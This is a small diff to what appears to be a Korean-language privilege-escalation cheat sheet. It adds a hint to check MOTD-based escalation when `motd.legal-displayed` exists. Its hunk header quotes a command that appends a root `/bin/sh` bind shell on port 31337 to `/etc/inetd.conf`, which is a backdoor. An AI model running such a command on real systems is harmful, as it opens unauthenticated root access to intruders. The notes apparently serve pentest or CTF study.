@@ -392,6 +392,8 @@ echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf
 <details>
   <summary><strong>MOTD</strong></summary>
 
+- `motd.legal-displayed`가 존재하면 `MOTD` 권한 상승을 확인.
+
 ```bash
 find / -user george 2>/dev/null
 ```
